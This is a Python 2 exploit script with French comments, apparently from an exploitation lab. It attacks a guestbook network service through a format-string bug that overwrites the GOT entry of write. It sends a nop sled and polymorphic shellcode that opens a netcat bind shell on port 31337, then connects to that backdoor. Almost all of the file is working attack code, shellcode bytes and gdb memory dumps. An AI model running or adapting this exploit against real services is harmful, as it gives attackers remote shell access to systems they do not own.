#!/usr/bin/env python2
# sploit qui utilise la vuln printf pour format string
# remplir le guestbook avec un formatstring
# puis afficher le book.

import socket
import os
import time
import sys

if len(sys.argv) != 3:
   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
   sys.exit(1)

# use sploit for reste password
concat = "../../bypass_NX_ASLR_ASCII_ARMOR_NOROP/handlerAddToGuestBook_newpasswd_strcpy/sploit.py " + sys.argv[1]
os.system(concat)

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], int(sys.argv[2])))
except:
   print "[-] Error connexion"
   sys.exit(1)

# (gdb)$ disass 0x8048918
# Dump of assembler code for function write@plt:
#    0x08048918 <+0>:  jmp    *0x804a9dc
#    0x0804891e <+6>:  push   $0x50
#    0x08048923 <+11>: jmp    0x8048868
# End of assembler dump.
# (gdb)$ disass 0x804a9dc
# Dump of assembler code for function _GLOBAL_OFFSET_TABLE_:
#    0x0804a9a8 <+0>:  aam    $0xffffffa8
#    0x0804a9aa <+2>:  add    $0x8,%al
#    0x0804a9ac <+4>:  clc

# 0xbfffe54c: 0x63303031	0x24323125  0x242d6e68	0x63303031
# 0xbfffe55c: 0x24333125	0x90906e68  0x90909090	0x90909090
# 0xbfffe56c: 0x90909090	0x90909090  0x90909090	0x90909090
# 0xbfffe57c: 0x90909090	0x90909090  0x90909090	0x90909090
# 0xbfffe58c: 0x90909090	0x90909090  0x90909090	0x90909090
# 0xbfffe59c: 0x90909090	0x90909090  0x90909090	0x90909090
# 0xbfffe5ac: 0x90909090	0x90909090  0x90909090	0x90909090
# 0xbfffe5bc: 0x90909090	0x90909090  0x90909090	0x90909090
# 0xbfffe5cc: 0x90909090	0x90909090  0x90909090	0x90909090
# 0xbfffe5dc: 0x90909090	0x90909090  0x90909090	0x90909090
# 0xbfffe5ec: 0x90909090	0x90909090  0x90909090	0x90909090
# 0xbfffe5fc: 0x90909090	0x90909090  0x90909090	0x90909090
# 0xbfffe60c: 0xeb909090	0xc9315e11  0x6c8043b1	0x8035ff0e
# 0xbfffe61c: 0xf67501e9	0xeae805eb  0x95ffffff	0x0766f566
# 0xbfffe62c: 0x9d8740e5	0x9da864a3  0x9764649d	0x8718be9e
# 0xbfffe63c: 0x9898629d	0x8716be98  0x88863c20	0xb50216be
# 0xbfffe64c: 0x34291d96	0x98a33434  0xa5a16255	0x68666855
# 0xbfffe65c: 0x62556c68	0x9764559a  0x6464a39e	0x00009da8
# 0xbfffe66c: 0x00000000	0x00000000  0x00000000	0x00000000
# 0xbfffe67c: 0x00000000	0x00000000  0x00000000	0x00000000

#
# Pour l'exploitation je vais reecrir sur la got de la fonction write
# qui est utilise dans la fonction sendLogMessage.
# Une foie la .got_write reecrit avec comme eip = 0xbfffe59c (en plein
# dans mes nops), il nous fondra activer la fonction sendLogMessage,
# pour ca un simple mot de passe erroner fera un call sur
# sendLogMessage(PASSWD_FAIL)
#
# Apres ca un backdoor sera en ecoute sur le port 31337
#

# nc -lp 31337 -e /bin//sh polymorphic (91 bytes)
# http://www.shell-storm.org/shellcode/files/shellcode-656.php
shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x43\x80\x6c\x0e\xff\x35" \
            "\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff" \
            "\x95\x66\xf5\x66\x07\xe5\x40\x87\x9d\xa3\x64\xa8" \
            "\x9d\x9d\x64\x64\x97\x9e\xbe\x18\x87\x9d\x62\x98" \
            "\x98\x98\xbe\x16\x87\x20\x3c\x86\x88\xbe\x16\x02" \
            "\xb5\x96\x1d\x29\x34\x34\x34\xa3\x98\x55\x62\xa1" \
            "\xa5\x55\x68\x66\x68\x68\x6c\x55\x62\x9a\x55\x64" \
            "\x97\x9e\xa3\x64\x64\xa8\x9d"

got      = "\xde\xa9\x04\x08\xdc\xa9\x04\x08" # 0xbf
#got     += "PADD"
#got     += "\xdd\xa9\x04\x08" # 0xff
#got     += "PADD"
#got     += "\xde\xa9\x04\x08" # 0xd8
#got     += "PADD"
#got     += "\xdf\xa9\x04\x08" # 0x5c
cmdID    = "1"
string   = "--"+got+"---%49120x%12$hn-"+"aaaa"+"%9650x%13$hn"

size_pad = 300 - (len(string) + len(shellcode))
padding  = "\x90" * size_pad
string  += padding + shellcode
arg2     = str(len(string) + 1)
frmtstr  = cmdID + " " + arg2 + string
print "[>] " + frmtstr

print "[+] Send format string (%d bytes)..." %(len(string))
try:
   s.send(frmtstr)
   s.close
except:
   print "[-] Error send frmtstr"
   sys.exit(1)

#############################
# exec frmtstr
#############################
time.sleep(2);

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], int(sys.argv[2])))
except:
   print "[-] Error connexion"
   sys.exit(1)

cmdID = "2"
pwd = "djo"
arg2  = str(len(pwd) + 1)
payload = cmdID + " " + arg2 + " " + pwd
print payload

print "[+] Exec format string..."
try:
   s.send(payload)
   s.close
except:
   print "[-] Error exec frmtstr"
   sys.exit(1)

######################################
# exec write for jump on my shellcode
######################################
time.sleep(2);

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], int(sys.argv[2])))
except:
   print "[-] Error connexion"
   sys.exit(1)

cmdID = "2"
pwd = "wtf"
arg2  = str(len(pwd) + 1)
payload = cmdID + " " + arg2 + " " + pwd
print payload

print "[+] Exec write for jump on my shellcode..."
try:
   s.send(payload)
   s.close
except:
   print "[-] Error exec write"
   sys.exit(1)

print "[+] done!"
time.sleep(2)
print "[+] Connecting to the backdoor..."
concat = "netcat " + sys.argv[1] + " 31337"
print "[+] Connected to the backdoor you can now execute cmd :)"
os.system(concat)


